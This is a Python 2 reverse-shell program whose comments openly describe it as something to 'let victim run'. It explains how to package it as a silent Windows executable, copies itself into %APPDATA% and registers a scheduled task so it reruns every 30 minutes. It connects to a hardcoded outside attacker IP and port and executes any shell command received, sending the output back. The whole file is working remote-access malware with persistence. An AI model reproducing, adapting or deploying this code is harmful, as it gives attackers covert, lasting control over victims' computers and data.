#/usr/bin/env python
### Use python 2
### let victim run this file
### To convert this file to windows exe, use "pyinstaller" and run "pyinstaller --noconsole --onefile reverse_tcp.py"
### ===========
### How to run this file
### python reverse_tcp.py
### python reverse_tcp.py attacker_ip
###      eg:
###           python reverse_tcp.py 192.168.2.5

import socket, subprocess, os, platform, sys



'''
   generate xml content according to schtasks_template.xml
   for schtasks program hack (windows only)
'''
def generateScheduleTask(schedule_interval_minutes):
    return """ <?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT""" + str(schedule_interval_minutes) + """M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2015-05-06T23:24:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>""" + os.getenv("APPDATA") +  """\\reverse_tcp.exe</Command>
    </Exec>
  </Actions>
</Task>
    """

if (platform.system() == "Windows"):
    ### Get APPDATA path
    appdata_path = os.getenv("APPDATA");
    target_path = appdata_path + "\\reverse_tcp.exe"   ## target path, this program will copy itself to that path
    current_path = os.path.abspath(__file__)
    ### Check whether file already copied to %Appdata%\reverse_tcp.exe
    if os.path.isfile(target_path): # already exists, do nothing
        pass
    else:

        ### Create schtasks_template.xml
        with open(appdata_path + "\\schtasks_template.xml", "w") as xml:
            xml.write(generateScheduleTask(30))  ## interval 30 minutes
            # xml.close()

        ### Copy self to %Appdata% for Windows. (%Appdata%\reverse_tcp.exe)
        os.system("copy " + current_path + " " + target_path)

        ### Setup schtasks for Windows.
        ### Run every 30 minutes.
        ### The the name of schedule task is reverse_tcp
        os.system("schtasks /CREATE /XML " + appdata_path + "\\schtasks_template.xml /TN reverse_tcp")
        ## os.system("schtasks /CREATE /SC MINUTE /MO 30 /TN reverse_tcp /TR %Appdata%\\reverse_tcp.exe")


if len(sys.argv) >= 2:
    attacker_ip = sys.argv[1]       ## get attacker's ip from command line
else:
    attacker_ip = "45.55.139.173"        ## attacker's ip, change this ip address if necessary.
attacker_port = 6667                ## attacker's port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   ## connect to attacker's machine
s.connect((attacker_ip, attacker_port))

while True:
    command = s.recv(1024)        # receive attacker's remote command
    if command == "exit":         # quit shell
        break
    if len(command) > 3 and command[0: 3] == "cd ": # change directory
        os.chdir(command[3:])
        s.send(" ")
        continue;
    if len(command) > 9 and command[0: 9] == "schedule ": # schedule the task when victim connect to attacker
        if (platform.system() == "Windows"):
            ## get task interval
            minutes = int(command[9:])

            ## create template
            xml = open("%Appdata%\\schtasks_template.xml", "w");
            xml.write(generateScheduleTask(minutes))  ## interval 30 minutes
            xml.close()

            ## create task
            os.system("schtasks /CREATE /XML " + os.getenv("APPDATA") + "\\schtasks_template.xml /TN reverse_tcp")
            s.send("The scheduled task has successfully been created")
            continue
        else: # wrong os
            s.send("Only for Windows system can use [schedule] command.")
            continue;


    # run command
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc.stdout.read()  + proc.stderr.read()
    if len(output) == 0:
        output = " "
    s.send(output)

# done
s.close()
